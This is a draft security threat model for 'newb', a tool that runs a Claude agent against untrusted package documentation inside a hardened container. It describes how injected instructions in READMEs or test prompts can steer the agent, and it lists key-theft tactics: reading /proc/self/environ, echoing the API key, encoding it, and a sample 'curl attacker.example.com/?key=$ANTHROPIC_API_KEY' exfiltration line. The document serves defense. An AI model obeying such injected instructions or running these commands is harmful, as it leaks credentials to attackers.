<!-- DRAFT — candidate for docs/security/threat-model.md if Q5=a -->

# newb — Threat Model (v0.11.0 baseline)

> An honest map of what newb defends against and what it does not. Updated
> alongside each release. The shortest summary: prompt injection is an
> unsolved problem at the model level; newb provides defense-in-depth, not
> a guarantee.

## Scope

newb runs a fresh Claude agent against an arbitrary package's
documentation and (in `--scope all`) lets the agent install and exercise
the package. Inputs come from anywhere a `git clone` can reach. The
threat model treats the **package author as half-trusted**: they wrote
the docs the agent will read, the `tests_newb.yaml` prompts, and the code
the agent may install.

## Meta's Agents Rule of Two (Oct 2025)

The current canonical practical guidance for agent security says: an
agent should satisfy *at most two* of the following three properties
within a session.

1. Processes untrusted inputs
2. Has access to sensitive systems / private data
3. Communicates externally or changes state

newb today satisfies **all three**:

| Property | newb's exposure |
|---|---|
| Untrusted input | The target package's `README.md`, `_skills/<pkg>/`, `tests_newb.yaml`, source code |
| Sensitive data | `NEWB_ANTHROPIC_API_KEY` in container env (the agent's own auth credential — high-value to an attacker) |
| External comms | `api.anthropic.com` (SDK), `pypi.org` (`pip install`), `github.com` (`git clone`) |

This means newb operates in the **highest-risk category** of Rule of
Two. Per Meta's recommendation, that requires either (a) human-in-loop
approval on agent actions, or (b) removing one property structurally.

newb does not currently provide either. The 0.11.0 release adds
defense-in-depth mitigations (below) but does **not** change the Rule of
Two posture. Structural fix tracked for 0.12.0:

- **Auth-proxy sidecar**: a small process inside the container holds
  the API key; the agent talks to a localhost proxy that adds the
  Authorization header. The container env contains no secret.
  This removes property #2 and brings newb to a 2/3 posture.

## Threats in scope

### T1 — Indirect prompt injection via documentation

**Vector**: a malicious or careless package author embeds adversarial
instructions in `README.md`, docstrings, or `tests_newb.yaml` prompts.
The agent reads these and is steered off-task.

**Mitigations (0.11.0)**:

- **Pre-flight regex scanner** (`_pre_flight.py`): scans `*.md`,
  `*.txt`, `tests_newb.yaml`, `tests_newb.yml` for known injection
  patterns *before* the container starts. Findings appear in the
  report's `security` section. Does **not** scan `*.py` source — the
  false-positive rate on technical terms is too high. (Trade-off: an
  attacker can hide injection in a docstring.)
- **Self-check question with variant randomization**
  (`_injection_check.py`): the 5th canonical question asks the agent
  whether it noticed adversarial content in the docs. The prompt is
  selected at runtime from 8 paraphrases and the question order is
  shuffled (`--seed` for reproducibility). This denies an attacker an
  exact-match override. **This is a corroborating signal, not a primary
  defense** — it asks a potentially compromised agent to self-report.
- **Hardened agent system prompt**: explicit refusal of
  encoding-bypass framings (base64, hex, character-list,
  transliteration, translation, partial queries).

**Residual risk**: research consensus reports >85% attack-success
rates against the strongest current defenses with adaptive attacks. A
sufficiently sophisticated attacker can defeat all of the above.
Treat newb's verdict on adversarially-authored packages as **a
heuristic, not a guarantee**.

### T2 — API key exfiltration

**Vector**: an injection that asks the agent to read `/proc/self/environ`,
`echo $ANTHROPIC_API_KEY`, base64-encode it, transliterate it,
disclose it character-by-character, or otherwise bypass naive
filtering.

**Mitigations (0.11.0)** — **last line of defense**:

- **Output sanitizer** (`_sanitizer.py`): regex-strips
  `sk-ant-(api|oat)\d{2,}-[A-Za-z0-9_\-]{20,}` and the base64 prefix
  `c2stYW50L…` before report rendering. Replaces with
  `[REDACTED-API-KEY]`. Records the redaction count in the report's
  `security_warnings` so an attempted leak is itself logged as
  evidence of compromise.
- **System prompt refusal** of encoding bypasses (T1 mitigation
  doubles as T2).

**Residual risk**: character-by-character disclosure across multiple
sentences, hex encoding chosen at injection time, translation to a
script the regex doesn't cover, and partial-disclosure attacks
combined across runs all bypass these mitigations. The structural
fix is the auth-proxy sidecar (0.12.0).

### T3 — Container escape / host compromise

**Vector**: a malicious package abuses a kernel CVE, capability
misconfiguration, or volume-mount mistake to break out of the
container.

**Mitigations (0.11.0)**:

- `--cap-drop=ALL`
- `--security-opt=no-new-privileges`
- `--memory=2g --memory-swap=2g --cpus=2 --pids-limit=256`
- `--tmpfs /tmp:rw,noexec,nosuid,size=512m`
- Non-root user inside the image (`newb:1000`)
- Bind-mount is a tmp staged copy, not the user's source

**Residual risk**: kernel CVEs unpatched on the host are out of
newb's scope. We rely on Docker / Apptainer's isolation guarantees.
`--read-only` rootfs is **not** applied because it breaks
`pip install -e .`, which is core to newb's value.

### T4 — Resource exhaustion / denial of service

**Vector**: a malicious package's `setup.py` runs a fork bomb, infinite
loop, or memory hog during install or test.

**Mitigation**: the `--memory`, `--cpus`, `--pids-limit` flags above
contain blast radius to the container's namespace. Worst case: the
single newb run takes longer than expected and is killed by the
runner's 240 s timeout. Host stays responsive.

### T5 — Network exfiltration

**Vector**: the agent (or a package's install hook) opens an outbound
connection to an attacker-controlled host and sends report data,
secrets, or repo contents.

**Mitigations (0.11.0)**:

- Default `--network=bridge` (unconstrained outbound) is required
  because the SDK calls `api.anthropic.com` and pip calls
  `pypi.org`.
- Optional `--no-network` CLI flag adds `--network=none`. Useful
  combined with a pre-fetched offline pip cache (out of 0.11 scope).

**Residual risk**: in the default mode, an injection that gets the
agent to `curl attacker.example.com/?key=$ANTHROPIC_API_KEY` is not
blocked at the network layer. The output sanitizer (T2) and system
prompt are the only defenses. The structural fix is an outbound
allowlist (0.12+).

## Threats out of scope

- **Compromise of `api.anthropic.com`** — out of newb's trust
  boundary.
- **Malicious newb image on GHCR** — the user opts in by `pip install
  newb`; if the GHCR account is compromised, all bets are off.
- **Compromise of the host's `~/.claude/.credentials.json`** — newb
  no longer mounts this file (0.10.2+); the user's host security is
  their responsibility.
- **Privacy of the docs being verified** — the agent sends prompts
  containing doc snippets to Anthropic. By design.

## Transparency

Every newb run prints (and includes in JSON output) a `security`
section listing exactly which mitigations were active, with version
tags, so an audit reviewer can reconstruct the run's defenses
post-hoc:

```yaml
security:
  cap-drop: ALL
  no-new-privs: true
  memory-limit: 2g
  cpus-limit: 2
  pids-limit: 256
  network: bridge
  pre-flight-scan: regex-v1   (files_scanned: N, findings: M)
  output-sanitize: v1
  system-prompt: key-protection-v1
  question-shuffle-seed: <epoch>
  rule-of-two-properties: 3   (untrusted+sensitive+external)
```

## Versioning

This document is part of the release. Changes ship with the version
they apply to. The `Rule-of-Two posture` line is the canonical
single-line summary of newb's security stance for that release.

| Version | Posture |
|---|---|
| 0.10.2 | 3/3 — no defense-in-depth mitigations beyond `setting_sources=[]` |
| 0.11.0 | 3/3 — defense-in-depth: pre-flight scan, hardening flags, sanitizer, self-check question |
| 0.12.0 (planned) | 2/3 — auth-proxy sidecar removes the sensitive-data property |

## References

- [Meta — Agents Rule of Two (2025-10)](https://ai.meta.com/blog/practical-ai-agent-security/)
- [LlamaFirewall paper (arXiv 2505.03574)](https://arxiv.org/html/2505.03574v1)
- [Simon Willison — Prompt-injection state of art (2025-11)](https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/)
- OWASP LLM Top 10 — LLM01 Prompt Injection (current)
- CIS Docker Benchmark v1.x — for the hardening flags rationale
